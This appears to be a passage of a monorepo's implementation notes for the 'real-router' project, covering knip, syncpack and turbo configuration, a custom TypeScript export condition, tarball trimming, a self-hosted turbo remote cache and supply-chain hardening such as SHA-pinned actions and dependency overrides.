Uses knip v6+ (migrated from v5). Schema URL updated to `https://unpkg.com/knip@6/schema.json`.

Global `ignoreDependencies`: `@stryker-mutator/api`, `jsdom` (test infrastructure).

Per-workspace configurations in `knip.json`:

- **Root**: entry scripts, ignores `fast-check` (used but not detected by knip)
- **`benchmarks`** (now at root level, excluded via `ignoreWorkspaces`): was `packages/router-benchmarks` with custom `entry: ["src/**/*.ts"]`; `src/` renamed to `core/`
- **`packages/react`**, **`packages/preact`**, **`packages/vue`**, **`packages/solid`**, **`packages/svelte`**: each lists `"ignore": ["src/dom-utils/**"]` to skip the symlinked shared sources (see #437 section)
- **`packages/solid`**: additionally ignores `@babel/preset-typescript`, `babel-preset-solid` (build-only deps)
- **`packages/svelte`**: additionally ignores `@real-router/browser-plugin` (workspace dep used at runtime)
- **`packages/dom-utils`**: `entry: ["tests/**/*.{ts,tsx}"]`, `project: ["tests/**/*.ts"]` — src is a symlink, not analyzed
- **`packages/vue`** and **`packages/svelte`**: explicit vitest config paths
- **`packages/*`** (catch-all): includes stryker config support

`ignore` array is intentionally empty — knip excludes `dist/`, `coverage/`, and `*.d.ts` by default.

`ignoreWorkspaces: ["examples/**"]` — examples have different dependency structures (Express, Vite, Playwright) that would trigger false positives in knip analysis. Uses `**` glob to match the nested `examples/{framework}/{app}` directory structure.

`ignoreBinaries: ["tree", "open", "view"]` — commands invoked in `scripts/*.sh` / `.github/workflows/*.yml` that knip cannot resolve to a dependency. `tree`/`open` are system binaries. **`view` is the pnpm-11 fallout (#f30ee95e):** the release workflow checks npm for an already-published version via `pnpm view <pkg> version` (pnpm 11 native, alias of `pnpm info` — replaced the old `npm view`). knip parses `pnpm <subcommand>` as "pnpm executes a local binary `<subcommand>`", and since `view` isn't a knip-recognized pnpm builtin it flags it as an unlisted binary. knip.json is plain JSON (no inline comments), so the rationale lives here. Surfaced on the first `git push` after the pnpm 10→11 migration (pre-push runs `knip`), not at migration time.

### syncpack Configuration

Uses syncpack v14 (Rust rewrite). `syncpack.config.mjs` enforces:

- Workspace packages use `workspace:^` protocol (pinned via `policy: "pinned"` version group)
- Peer dependencies use `>=` ranges
- All other dependencies are pinned (exact versions)
- Consistent versions across all packages (`policy: "sameRange"`)

**v13 → v14 migration notes:**

- `lintFormatting`, `lintSemverRanges`, `lintVersions` config options removed (always enabled in v14)
- `fix-mismatches` command → `fix`
- Local package versions (`.version` field) must be ignored in both `semverGroups` and `versionGroups` — v14 includes them in `sameRange` checks, causing false positives when comparing `0.x.y` with `workspace:^`
- Workspace dependencies moved to a separate `pinned` version group (`pinVersion: "workspace:^"`) — v14's `sameRange` cannot compare `workspace:^` specifiers

## Turbo Configuration

Uses turbo v2.9.6.

**v2.9 migration:** Adopted `futureFlags` for the new global configuration schema:

```json
"futureFlags": {
  "globalConfiguration": true,
  "errorsOnlyShowHash": true,
  "affectedUsingTaskInputs": true,
  "watchUsingTaskInputs": true,
  "filterUsingTasks": true
}
```

`globalConfiguration: true` moves top-level settings into a `global` block: `concurrency`, `passThroughEnv`, `inputs`, `env`. This replaces the deprecated flat `globalPassThroughEnv`, `globalDependencies`, etc.

`global.inputs` defines config-level inputs that affect all tasks (e.g., `tsconfig.json`, `pnpm-lock.yaml`, `eslint.config.*`).

`global.env` passes `BENCH_ROUTER`, `BENCH_NO_VALIDATE`, `BENCH_SECTIONS` for benchmark configuration.

**v2.8.11 migration (historical):** Removed `"daemon": false` from `turbo.json` — daemon was removed from `turbo run` in v2.8.11 (option deprecated, daemon only used for `turbo watch`).

### Concurrency Limit

`turbo.json` → `global.concurrency`:

```json
{
  "global": {
    "concurrency": "4"
  }
}
```

**Why:** Without a limit, turbo runs all tasks in parallel on uncached runs. Property-based tests (fast-check) are memory-intensive — running 5+ property test suites + builds simultaneously causes OOM kills (exit code 137). With cache, most tasks are hits and memory stays low. The limit prevents OOM on cold runs (cleared cache, new CI runner, fresh clone).

### Environment Variables

`turbo.json` → `global.passThroughEnv`:

```json
{
  "global": {
    "passThroughEnv": ["CI", "GITHUB_ACTIONS"],
    "env": ["BENCH_ROUTER", "BENCH_NO_VALIDATE", "BENCH_SECTIONS"]
  }
}
```

`CI` and `GITHUB_ACTIONS` are passed through globally. `BENCH_*` variables are declared as global env inputs for cache invalidation. Test task uses additional `passThroughEnv` for `CI`.

### Task Renames

- `publint` → `lint:package`
- Added `lint:types` for arethetypeswrong

### Build Dependency Chain

```
bundle → depends on ^bundle (upstream packages only, no test/lint)
build  → depends on bundle + test + test:properties + test:stress (orchestrator, no own command)
test → depends on ^bundle + lint + type-check
test:properties → depends on ^bundle + test + lint + type-check
test:stress → depends on ^bundle + test:properties + test + lint + type-check
type-check → no dependencies (reads src directly via customConditions, #431)
lint:package → depends on bundle (publint validates exports paths in dist)
lint:types → depends on bundle (attw validates .d.ts across module variants)
```

**`bundle` vs `build`:** `bundle` is a lightweight task that only runs the bundler (tsdown/rollup/svelte-package) and upstream `^bundle`. `build` is an orchestrator with `Command = <NONEXISTENT>` (no script in package.json) that depends on `bundle` + all test tiers. turbo runs all dependencies, skips the non-existent command, and records cache. This allows `turbo run bundle` to produce dist/ without running tests.

**Cache sharing:** `turbo run build` triggers `bundle` as a dependency → caches `bundle:*`. Subsequent `turbo run bundle` gets cache hits. CI Pipeline uses this: step 1 (test) triggers `^bundle` for upstream, step 2 (`turbo run bundle`) gets cache hits for upstream and only runs bundle for leaf affected packages.

**Why `^bundle` instead of `^build`:** Test/lint tasks only need upstream `dist/` (for import resolution), not upstream test results. Depending on `^build` would run upstream tests before downstream tests — unnecessary serialization. Upstream tests run via their own `turbo run build` in pre-push hooks and CI.

**Why type-check has no dependencies:** After the `@real-router/internal-source` custom export condition was added (#431 root fix), monorepo `tsc --noEmit` resolves workspace packages directly to `src/*.ts` via `tsconfig.json` `customConditions`. No `dist/` is required. See "Custom `@real-router/internal-source` Export Condition" below for the full saga.

### Input Patterns Performance

**Problem:** Turbo `--dry-run` took 92 seconds with valid cache due to glob patterns scanning `node_modules`.

**Root cause:** Patterns like `**/*.{ts,tsx}` in `inputs` were scanning 536MB of `node_modules` (50k+ files) for hash calculation.

**Solution:** Add explicit exclusion to all tasks with recursive globs:

```json
{
  "lint": {
    "inputs": [
      "**/*.{ts,tsx,js,jsx}",
      "!dist/**",
      "!coverage/**",
      "!**/node_modules/**"
    ]
  },
  "type-check": {
    "inputs": ["**/*.{ts,tsx}", "!dist/**", "!**/node_modules/**"]
  },
  "test": {
    "inputs": [
      "src/**/*.{ts,tsx}",
      "tests/**/*.{ts,tsx}",
      "!**/node_modules/**"
    ]
  }
}
```

**Result:** 92s → 1.4s (65x improvement).

**Rule:** Always add `!**/node_modules/**` when using `**/*.{ext}` patterns in turbo.json inputs.

### `outputLogs: "errors-only"` for All Tasks

**Problem:** With 25 packages + 70 example applications, turbo output was noisy — successful tasks printed verbose logs, making it hard to spot failures.

**Solution:** Added `"outputLogs": "errors-only"` to every task in `turbo.json`. Tasks are silent on success; full output appears only on failure.

**Verbose mode:** Root `package.json` provides `build:verbose` and `test:verbose` scripts that override with `--output-logs=full` for debugging:

```bash
pnpm build:verbose      # Build with full output
pnpm test:verbose       # Tests with full output
```

### Input Patterns for Vue and Svelte

**Problem:** Turbo `inputs` patterns only covered `*.{ts,tsx}`. Vue SFCs (`.vue`) and Svelte components (`.svelte`) were not tracked — turbo could miss cache invalidation for changes in these files.

**Solution:** Extended input patterns in `build` and `type-check` tasks:

```json
// Before
"src/**/*.{ts,tsx}"
"**/*.{ts,tsx}"

// After
"src/**/*.{ts,tsx,vue,svelte}"
"**/*.{ts,tsx,vue,svelte}"
```

### `build:dist-only` → `bundle` Task Evolution

**Phase 1 — `build:dist-only` (#403):** Introduced as a "fast build without tests" for CI bundle size comparison. Became a workaround for flaky CI after #421 forced `type-check` to read `dist/` artifacts. Created a race condition with parallel `tsdown` invocations exposed by #431.

**Phase 2 — Removed (#431 root fix):** `build:dist-only` removed entirely. `@real-router/internal-source` custom export condition let `tsc` read `src/*.ts` directly. See "Custom `@real-router/internal-source` Export Condition" below.

**Phase 3 — `bundle` task (current):** Re-introduced as `bundle` with a cleaner design. Unlike the old `build:dist-only` (which was a parallel copy of `build`), `bundle` is the **canonical build step** — `build` depends on it:

```json
"bundle": {
  "dependsOn": ["^bundle"],
  "outputs": ["dist/**"],
  "inputs": ["src/**/*.{ts,tsx,vue,svelte}", "tsdown.config.*", "tsconfig.json", "package.json"]
},
"build": {
  "dependsOn": ["bundle", "test", "test:properties", "test:stress"],
  "inputs": [],
  "outputs": []
}
```

Package.json scripts: `"bundle": "tsdown"` (no `"build"` script — turbo handles `<NONEXISTENT>` by running dependencies and recording cache). Cache sharing: `turbo run build` caches `bundle:*`, subsequent `turbo run bundle` gets hits.

Used in CI: smoke test and bundle-size run `turbo run bundle` (~32 tasks) instead of `turbo run build` (~161 tasks with full test graph).

### Custom `@real-router/internal-source` Export Condition

**Problem:** After #421 removed the `"development"` export condition (because Vite auto-activates it at dev time and broke external consumers via resolution of missing `src/`), monorepo `tsc` was forced to resolve workspace types via `exports` → `dist/*.d.ts`. This created a chain of cascading failures:

1. **Race condition:** `type-check.dependsOn: ["build:dist-only"]` and `test.dependsOn: ["^build"]` both triggered `tsdown` on the same `dist/` directory in parallel. `tsdown` cleans `dist/` before writing, creating a window where downstream `type-check` would see missing files.

2. **Incomplete `.d.ts` generation (#425):** tsdown + rolldown RC (pre-1.0) had gaps in declaration generation. Monorepo `tsc` started seeing these gaps directly instead of reading the richer original `src` types.

3. **Remote-cache staleness (#431):** turbo's remote cache served stale `dist/` artifacts for packages whose own `src/` hadn't changed, even when their workspace dependencies' `src/` had. Downstream `type-check` then ran against a `dist/` that didn't match the current source graph.

All three of these caused flaky CI across the `#413 → #414 → #418 → #419 → #421 → #423 → #424 → #425` saga that started with #413 (April 6, 2026) and manifested as the first red build on April 8.

**Solution:** Use a custom scoped export condition `@real-router/internal-source` that external tools (Vite, Webpack, Node.js) don't activate automatically. The condition is just a **string key** in `package.json` `exports` — it does nothing until a resolver explicitly activates it by including that exact string in its list of active conditions. Enable it explicitly in all four monorepo-internal resolvers:

- **`tsc`** — Root `tsconfig.json` via `compilerOptions.customConditions: ["@real-router/internal-source"]`. Activates the condition for `tsc --noEmit` and IDE type-checking (VSCode TypeScript server).
- **Vitest** — `vitest.config.common.mts` via the `workspaceSourceAliases()` helper. The helper reads `exports["."]["@real-router/internal-source"]` directly from each workspace `package.json` and synthesizes a `resolve.alias` entry. Preferred over setting `resolve.conditions` globally because a naive conditions list breaks `preact` tests (dual-package hazard from condition order interference with `preact/hooks`).
- **ESLint (`import-x/no-unresolved`)** — `eslint.config.mjs` via `createTypeScriptImportResolver({ conditionNames: [...] })`. The `eslint-import-resolver-typescript` package maintains its **own** `conditionNames` list independent of `tsconfig.json` `customConditions`. Without adding `@real-router/internal-source` to it, the resolver falls through to the `types` condition, reads `dist/*.d.mts`, and fails when `dist/` isn't built yet (discovered on first CI push — `lint` has `dependsOn: ["^build"]` which only builds upstream, not own package).
- **Package declaration** — `packages/*/package.json` first key in every `exports` subpath: `"@real-router/internal-source": "./src/<entry>.ts"`. Declares the condition — without this no resolver can see it.

All four sites must use the **exact same string**. The name itself is arbitrary but must be byte-identical everywhere. Forgetting one site means the resolver silently falls through to the legacy `dist/`-based path.

Example from `packages/core/package.json`:

```jsonc
{
  "exports": {
    ".": {
      "@real-router/internal-source": "./src/index.ts",
      "types": {
        "import": "./dist/esm/index.d.mts",
        "require": "./dist/cjs/index.d.ts",
      },
      "import": "./dist/esm/index.mjs",
      "require": "./dist/cjs/index.js",
    },
  },
}
```

For `tsc` in the monorepo with `customConditions: ["@real-router/internal-source"]`:

- Resolution enters conditional exports
- First-match `@real-router/internal-source` wins → reads `./src/index.ts` directly
- No `dist/` lookup, no dependency on `tsdown` having run

For external consumers (Vite, Webpack, Node.js, etc.):

- They don't know about `@real-router/internal-source` — skip it
- Fall through to the standard `import` / `require` / `types` keys
- Resolve via `dist/` exactly as before — published package behavior is unchanged

**Why "development" wasn't viable:** Vite automatically activates the `"development"` condition in dev mode, so any package shipping `"development": "./src/..."` would have Vite trying to load `src/*.ts` from the installed tarball. This broke external Vite consumers even when they didn't want source resolution.

**Why a custom scoped name is safe:** Standard export conditions (`import`, `require`, `browser`, `node`, `default`, `development`, `production`) are reserved by tooling and may be auto-activated. Custom names like `@real-router/internal-source` — prefixed with a package-like scope — are only activated when a tool explicitly lists them. TypeScript `customConditions` supports this since 5.0.

**Why the `internal-source` suffix, not just `source`:** The first implementation used `@real-router/source`, but that visually collided with the real workspace package `@real-router/sources` (plural). Seeing both in the same `package.json` — one as a dependency and one as an exports key — caused immediate confusion ("are these related?"). Renamed to `@real-router/internal-source` to:

- Preserve the TypeScript-recommended scoped naming convention
- Make the "internal / not public API" signal explicit for future maintainers
- Be visually distinct from the `sources` package (no risk of misreading `sources` vs `source` as a typo)

**Rejected alternatives:**

- Strip `"development"` at publish time — requires a pre-publish transform hook, brittle and hidden magic
- Wait for `tsdown`/`rolldown` to stabilize `.d.ts` generation — no upstream timeline, out of our control
- Keep `"development"` and add `resolve.conditions` override to external consumer configs — pushes burden to users
- Rename to a standard condition like `"development"` — Vite breaks external consumers, #418 all over again

**Staged rollout (6 commits on the fix branch, PR #443):**

1. **Stage 1 — POC (`4e756cdc`):** Added `@real-router/internal-source` to `@real-router/types` only, plus `customConditions` in root `tsconfig.json`. Validated with `rm -rf packages/core-types/dist && tsc --traceResolution` from a downstream package — confirmed the resolver entered conditional exports and matched the new condition before the `types` fallback. Vitest side deliberately untouched during POC to isolate the TypeScript-side signal.

2. **Stage 2 — Mass migration (`a336b2d2`):** Added `@real-router/internal-source` to all 28 packages that publish an `exports` field (27 with the condition plus `@real-router/types` from Stage 1). Ran via a one-off Node script walking `packages/*/package.json` and inserting the condition as the first key of each subpath export. Initial script assumed `.ts` entries only; had to be extended with `.tsx` and directory-index fallbacks (discovered for `@real-router/solid` uses `src/index.tsx` and `@real-router/core` has `./api` / `./utils` subpaths backed by directory indexes rather than flat files). `svelte` was intentionally excluded — `svelte-package` build emits a non-standard exports shape using a `"svelte"` condition instead of `import`/`require`, and `.svelte` source files aren't directly readable by `tsc`. `svelte` is a leaf adapter in the monorepo (nothing imports it), so the race condition doesn't affect it.

3. **Stage 3 — Task graph cleanup (`e1d135b7`):** Removed the `build:dist-only` task entirely, reset `type-check.dependsOn` to `[]`, moved `lint:package` and `lint:types` to depend on `build`, removed `build:dist-only` scripts from all package.json files, and updated every workflow and hook to use `build`. Also fixed a long-hidden bug in `workspaceSourceAliases()` that failed to generate aliases for `@real-router/solid` because it only tried `.ts` while solid uses `.tsx`. The bug had been **silently masked** before Stage 3 by the old `type-check.dependsOn: ["build:dist-only"]` dependency chain, which eagerly built solid's `dist/` and let Vitest fall through to the dist-based resolution via exports. Removing that dependency chain exposed the broken alias, which surfaced as `Failed to resolve entry for package "@real-router/solid"` in solid's Vitest tests.

4. **Stage 4 — Documentation + changesets (`b5800dbe`):** `CLAUDE.md` bullet point in Non-Obvious Conventions. This `IMPLEMENTATION_NOTES.md` section. 22 changeset files (one per public package that received the condition, `minor` bump, referencing #431), generated by a helper script. `svelte` excluded (exports not modified); private packages excluded (don't publish).

5. **Stage 5 — ESLint resolver activation (`fbb9fe9b`):** First push to CI failed with `Unable to resolve path to module '@real-router/core'` in core's test setup files. Root cause: `eslint-import-resolver-typescript` maintains its **own** `conditionNames` list (in `eslint.config.mjs`), independent of `tsconfig.json` `customConditions`. Without `@real-router/internal-source` in that list, the resolver skipped the new condition and fell through to `types` → `dist/*.d.mts`, which doesn't exist at lint time (`lint.dependsOn: ["^build"]` only builds upstream, not own package). The regression was masked locally by a persistent `.eslintcache` from earlier green runs. Fix: replaced `"development"` (a dead condition since #421) with `"@real-router/internal-source"` as the first entry in the resolver's `conditionNames`. Full clean validation (including `.eslintcache` deletion) caught the issue on a second attempt.

6. **Rename `@real-router/source` → `@real-router/internal-source` (`990c5f2f`):** Pre-merge cleanup after spotting the naming collision with the real `@real-router/sources` package. Script replaced the string across 76 files (5 config + 28 package.json + 22 changeset content + 22 changeset filenames renamed from `source-condition-*.md` to `internal-source-condition-*.md`). Used `sed` with `[^s]` negative lookahead to avoid touching the `@real-router/sources` package name. Grep verification confirmed zero remaining `@real-router/source` references and unchanged `@real-router/sources` count.

**Trade-off analysis:**

- **Monorepo `tsc` overhead:** Now reads `src/*.ts` directly (larger AST, more files), adds a few seconds to cold type-check. Acceptable — the source types are richer and correct.
- **Vitest alias generation:** `workspaceSourceAliases()` continues to handle Vitest runtime resolution. Adding `@real-router/internal-source` to Vitest `resolve.conditions` globally was attempted in Stage 1 POC but broke `preact` tests (dual-package hazard from condition order interference with `preact/hooks`). Left as future work — alias is sufficient and deterministic.
- **`svelte` coverage:** Not migrated, but it's a leaf adapter. Its `type-check` still reads its own `src` and uses `svelte-check` which has its own resolution logic.
- **Four activation sites:** Each new monorepo-internal tool (type-checker, bundler, linter) must explicitly opt into the condition. Not zero-config, but the alternative (standard condition name like `"development"`) collides with auto-activation in external tools — which is exactly what broke #418 and triggered the entire saga.

**Related issues closed by this fix:**

- **#431** — Flaky CI `type-check` from stale `dist/`. Structurally impossible now that `type-check` doesn't depend on `dist/`.
- **#425** — Incomplete `.d.ts` from tsdown+rolldown RC. No longer affects monorepo `tsc`. Still affects external consumers until tsdown/rolldown stabilize, but that's out of our hands.
- **#403** — Build:dist-only optimization. Evolved into the `bundle` task — lightweight bundling without test dependencies. CI bundle size and smoke test use `turbo run bundle` instead of `turbo run build`.

### Published packages ship `dist/` only — drop `src/` from `files[]` (#728)

**Problem:** Every public package declared `files: ["dist", "src"]` (`@real-router/angular`: `["dist", "src", "ssr"]`), so the npm tarball shipped the original `src/` tree **and** full sourcemaps (`tsdown.base.ts` sets `sourcemap: true` + `dts.sourcemap: true`, and the emitted `*.map` embed `sourcesContent`). Repo-wide that meant ≈ **4.3 MB** of `src/` + maps versus only ≈ **0.9 MB** of actual runtime JS — install footprint dominated by non-runtime files (~5× the runtime). `@real-router/core` alone was 1.5 MB unpacked (842 KB maps + 299 KB src + 160 KB JS).

The shipped `src/` was not just redundant but **broken** for every symlink-consuming package. `npm pack` does **not** follow symlinked directories, so packages that symlink shared sources into `src/` (`src/dom-utils → shared/dom-utils`, `src/browser-env → shared/browser-env`, `src/shared-ssr → shared/ssr`) shipped a `src/` graph with dangling imports — e.g. `react`/`preact`/`solid`/`vue` tarballs contained **0** `src/dom-utils/*` files, `rsc-server-plugin`/`ssr-data-plugin` contained **0** `src/shared-ssr/*`. The `"@real-router/internal-source": "./src/..."` export condition in the published `package.json` therefore pointed at a non-resolvable graph.

**Solution:** Drop `src` from `files[]` on **all** public packages (kept `dist`; `@real-router/angular` → `["dist", "ssr"]`). Sourcemaps stay — with `sourcesContent` embedded they already provide source-level debugging into the library, which is exactly why the separate `src/` tree is redundant. Policy: **keep maps (the debugging mechanism), drop `src/` (the broken, redundant duplicate)**.

`@real-router/svelte` needed an extra cleanup: `svelte-package` materializes the symlinked `dom-utils` **per file** into `dist/dom-utils/*` (unlike tsdown, which bundles it inline), and dragged `dist/dom-utils/__test-helpers/*` (test fixtures) and `dist/dom-utils/CLAUDE.md` (internal doc) along with it. Its `bundle` script now appends `rimraf dist/dom-utils/__test-helpers dist/dom-utils/CLAUDE.md` (rimraf `6.1.3`, matching `@real-router/solid`). `@sveltejs/package` 2.x removed the `config.package.files` filter hook (throws "config.package is no longer supported"), so post-build removal is the supported path.

**Why this is safe:**

- **No external resolution path used `src/`.** External consumers (Vite/Webpack/Node) resolve via `import`/`require` → `dist/`; only monorepo `tsc` activates `@real-router/internal-source`, and it resolves off the **workspace source tree**, not the tarball (`customConditions` works in-repo regardless of `files[]`). The published `internal-source` key still points at `./src/...`, but no external resolver activates that scoped condition — see "Custom `@real-router/internal-source` Export Condition" above.
- **Verified with `publint` + `attw`.** Both pass clean on every package after the change — neither flags the now-dangling `internal-source` condition, because both check only the standard conditions (`types`/`import`/`require`/`default`/`bundler`/`node10`/`node16`).
- **No consumer-bundle impact.** Tree-shaking already excluded `src/`/maps from application bundles; this is purely a `node_modules` / install-size reduction. `@real-router/svelte` dropped from 114 → 78 tarball files (≈ 154 kB unpacked).

**Verification recipe (per package):** `npm pack --dry-run` → confirm `0` `src/` entries; `pnpm lint:package` (publint) + `pnpm lint:types` (attw) → green.

**Each affected package gets a `patch` changeset** so the smaller tarball actually reaches npm on the next release (the `files[]` edit doesn't touch `src/`, so `changeset-check.yml`'s `require-changeset` gate wouldn't otherwise demand one).

### `test:e2e` Task

New turbo task for Playwright e2e tests in example applications:

```json
"test:e2e": {
  "dependsOn": ["^bundle"],
  "inputs": [
    "src/**/*.{ts,tsx,vue,svelte}",
    "e2e/**/*.{ts,tsx}",
    "playwright.config.*",
    "index.html",
    "vite.config.*",
    "package.json"
  ]
}
```

Depends on `^bundle` to ensure packages are compiled before examples run e2e tests. Uses `^bundle` (not `^build`) — e2e tests only need dist/, not upstream test validation.

### Self-Hosted Turbo Remote Cache (#490)

**Problem:** Vercel Remote Cache evicted artifacts non-deterministically on the free tier. Same SHA rerun showed **4 tasks going HIT → MISS** in ~2 minutes with zero input drift (#490 evidence: `@real-router/{angular,preact,react,solid}#lint`; `@real-router/svelte#test:properties` never landed remotely). Cost: 30–60 s wasted per PR at random.

**Solution:** Self-hosted [`ducktors/turborepo-remote-cache`](https://github.com/ducktors/turborepo-remote-cache) on Google Cloud Run with Cloudflare R2 as S3-compatible backend. Deployment runbook: [`.github/turbo-remote-cache-deployment.md`](.claude/turbo-remote-cache-deployment.md).

**Why R2 + Cloud Run:**

| Constraint | How this stack satisfies it |
|---|---|
| $0/mo for OSS-scale CI | R2: 10 GB + 1M Class A / 10M Class B ops free. Cloud Run: 2M req/mo + 360 K GB·s free. Well above footprint. |
| Deterministic retention | We control TTL via R2 lifecycle rules; no vendor-side eviction. |
| Compatible with existing `TURBO_*` env contract | Adds `TURBO_API` (public URL var); `TURBO_TOKEN`/`TURBO_TEAM` reused. |
| Minimal moving parts | Single stateless container, public endpoint, static bearer auth (`AUTH_MODE=static`). |

**Client wiring.** All 4 workflows (`ci.yml`, `post-merge.yml`, `changesets.yml`, `examples.yml`) declare `TURBO_API: ${{ vars.TURBO_API }}` alongside existing `TURBO_TOKEN`/`TURBO_TEAM`. When `TURBO_API` is unset, turbo falls back to Vercel's default endpoint — trivial rollback.

**Security model.** Cloud Run deployed with `--allow-unauthenticated`; access gated solely by `TURBO_TOKEN` (Bearer header). IAM-based auth (Workload Identity Federation) was rejected as dead weight: a GHA-secret leak compromises both models equally, and IAM adds GCP SA provisioning + 4-workflow auth steps — blows the 1–2 h setup budget without improving the threat model.

**Cost-control guardrails.** `--max-instances=3`, `--min-instances=0`, `--memory=512Mi`, `--timeout=60s`. Caps runaway autoscale (malicious replay or misconfigured CI loop) at free-tier ceiling.

**Operational notes.** Cold start ~2–5 s (min-instances=0) — still strictly better than 30–60 s Vercel miss. Bucket size reviewed monthly; R2 lifecycle rule (delete > 30 d old) added when approaching 10 GB.

**Empirical results (PR #491, April 2026).** Four back-to-back CI runs on the self-hosted cache validated both the headline fix and cascade precision:

| Scenario | Pipeline | Tasks cached | Notes |
|---|---|---|---|
| Cold (first run, empty R2) | 14m39s | baseline | Populates R2 |
| Rerun on same SHA | **3m5s** | ~100 % | `>>> FULL TURBO`. Zero `HIT → MISS` — the #490 failure mode is gone |
| Foundation change (`@real-router/types`) | 13m1s | 30/162 | ~132 tasks invalidated by `dependsOn: ^bundle` cascade — unavoidable for a foundational package |
| Leaf change (`@real-router/memory-plugin`) | **1m34s** | **156/162** | Only the 6 tasks of the edited package are MISS; cascade is surgically precise |

R2 HTTP summary across all four runs: 0× 401, 0× 5xx, `PUT 200` on every upload, `GET 200/404` split matches expected cold/warm state. Typical PR touches 1–3 leaf-ish packages → expect ~1–3 min CI vs 14+ min with a hypothetical cold cache.

**Gotcha — GitHub Variables vs Secrets.** `TURBO_API` must be added as a **repository Variable**, not a Secret. The URL is not sensitive, and the workflows reference it as `${{ vars.TURBO_API }}`. Creating it as `secrets.TURBO_API` is silently wrong: `vars.TURBO_API` then resolves to an empty string, turbo falls back to the Vercel default, all requests authenticate with a token Vercel doesn't know → 100 % cache MISS. Diagnose via any workflow log — if the `env` block of a step shows `TURBO_API:` with nothing after the colon (while `TURBO_TOKEN: ***` is masked), the variable is missing from the Variables tab. Only `TURBO_TOKEN` belongs in Secrets.

## macOS Development Setup

### Spotlight Exclusion

**Problem:** macOS Spotlight continuously indexes `node_modules`, causing high I/O during file operations.

**Symptoms:**

- `pnpm install` slow even with warm cache
- High `system` time in `time` output (2:1 ratio system:user = I/O bottleneck)
- `mds_stores` process using CPU

**Solution:** Exclude `node_modules` from Spotlight indexing:

```
System Settings → Siri & Spotlight → Spotlight Privacy → "+" → select node_modules folder
```

**Verification:**

```bash
# Should return 0 results if excluded
mdfind -onlyin ./node_modules "kMDItemFSName == '*.ts'" | wc -l
```

**Additional recommendations:**

- Exclude `node_modules` from Time Machine backups
- Exclude from antivirus real-time scanning (if applicable)

## Supply-Chain Security

### GitHub Actions Pinned by SHA

Third-party (non-GitHub) actions are pinned to commit SHAs instead of mutable tags. GitHub-official actions (`actions/checkout`, `actions/setup-node`, etc.) use mutable version tags since GitHub's own actions are considered trusted.

```yaml
# ❌ Third-party with mutable tag - can be hijacked
uses: changesets/action@v1

# ✅ Third-party with immutable commit SHA
uses: changesets/action@6a0a831ff30acef54f2c6aa1cbbc1096b066edaf # v1.7.0

# ✅ GitHub-official with version tag (trusted)
uses: actions/checkout@v6
```

**Pinned third-party actions:**

| Action                              | SHA         | Tag     |
| ----------------------------------- | ----------- | ------- |
| `changesets/action`                 | `6a0a831f`  | v1.7.0  |
| `codecov/codecov-action`            | `57e3a136`  | v5      |
| `SonarSource/sonarqube-scan-action` | `a31c9398`  | v7      |
| `dependabot/fetch-metadata`         | `ffa630c6`  | v2      |
| `github/codeql-action/*`            | version tag | v3.30.3 |

**Why:** Mutable tags can be force-pushed by a compromised maintainer. SHA pins are immutable — even if the tag is moved, the pinned commit stays the same.

### Minimum Release Age (Removed)

Previously used `minimum-release-age=1440` in `.npmrc` to block packages published less than 24 hours ago. Removed due to high maintenance overhead — every dependency update required temporary exclusions in `pnpm-workspace.yaml` with manual cleanup. The `strict-dep-builds=true` setting (pnpm 10) and `pnpm.onlyBuiltDependencies` allowlist now provide the primary supply-chain protection for lifecycle scripts.

**`onlyBuiltDependencies` allowlist:** `@parcel/watcher`, `core-js`, `electron`, `esbuild`, `fsevents`, `lmdb`, `msgpackr-extract`, `unrs-resolver`, `vue-demi`. Only these packages are permitted to run post-install scripts. `vue-demi` was added after it started failing in CI with `ERR_PNPM_IGNORED_BUILDS` (pnpm 10 blocks unapproved build scripts by default); `electron` and its transitive native deps (`@parcel/watcher`, `lmdb`, `msgpackr-extract`) were added when the Electron desktop examples landed.

### Security Overrides

`pnpm.overrides` in root `package.json` pins transitive dependencies to patched versions. Overrides are version-range-scoped where possible (e.g., `minimatch@3`, `minimatch@9`) to target specific major versions:

```json
"flatted": ">=3.4.2",
"axios": ">=1.13.5",
"qs": ">=6.14.2",
"rollup": "4.61.0",
"undici": ">=7.24.0",
"path-to-regexp": ">=8.4.0",
"node-forge": ">=1.4.0"
```

Each override addresses a known vulnerability in older versions. Version-scoped overrides (e.g., `"minimatch@3": "~3.1.4"`) prevent inadvertent major bumps of transitive dependencies.

**`rollup` is an exact pin, not a `>=` floor (declared↔installed drift).** `rollup` is a direct devDependency of `packages/solid` (it builds with rollup + babel-preset-solid) with an exact, Dependabot-managed version. A `>=` override shadows that exact declaration with a range, and pnpm then keeps whatever rollup version is already locked (it does not bump a satisfied `>=` range to latest) — so the lockfile drifted to `4.60.2` while `packages/solid` declared `4.61.0`, surfacing as an "installed doesn't match declared" diagnostic. Pinning the override to the exact version `packages/solid` declares keeps installed == declared. **Coupling:** when Dependabot bumps rollup in `packages/solid`, this override must be bumped in lockstep (or the exact pin will hold rollup back). The pin still satisfies the original `>=4.59.0` security floor.

### Compatibility Pin: `fflate` at `0.8.2` (attw breakage)

**Problem:** A Dependabot bump (`ink 7.0.1 → 7.0.5`, [#692](https://github.com/greydragon888/real-router/pull/692)) pulled `fflate@0.8.3` into the tree. `pnpm dedupe --check` (the `lint:dedupe` CI step) then wants to collapse `@arethetypeswrong/core@0.18.2` onto the single newest `fflate@0.8.3`. But `attw` (`lint:types` = `attw --pack .`) reads the packed tarball via `fflate`, and `0.8.3` crashes it for **every** package with `Cannot read properties of undefined (reading 'filename')`. This creates a direct conflict: satisfying `lint:dedupe` (dedupe → 0.8.3) breaks `lint:types` (attw needs 0.8.2).

**Solution:** `"fflate": "0.8.2"` in `pnpm.overrides`. Forces a single `fflate` version across the tree, which simultaneously (a) satisfies `pnpm dedupe --check` (one version, nothing left to collapse) and (b) keeps `attw` on the working `0.8.2`. This is the only override that pins to an exact *older* version for compatibility rather than `>=` for security.

**Why:** `0.8.3` is a patch with no public-API change any consumer depends on, so pinning down is safe. Remove this override once `@arethetypeswrong/core` ships a release compatible with `fflate@0.8.3` (or `fflate` patches the tar-read regression) — verify by deleting the line, running `pnpm install && pnpm -F @real-router/fsm lint:types`, and confirming attw stays green.

### Dependency License Review

`.github/dependency-review-config.yml` defines allowed licenses for all dependencies. Dependency Review check fails on PRs that introduce packages with licenses outside the allow-list.

**Allowed licenses:** MIT, MIT-0, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC, 0BSD, Unlicense, CC0-1.0, CC-BY-4.0, BlueOak-1.0.0, Python-2.0, LGPL-3.0-only, GPL-3.0-only, GPL-3.0-or-later.

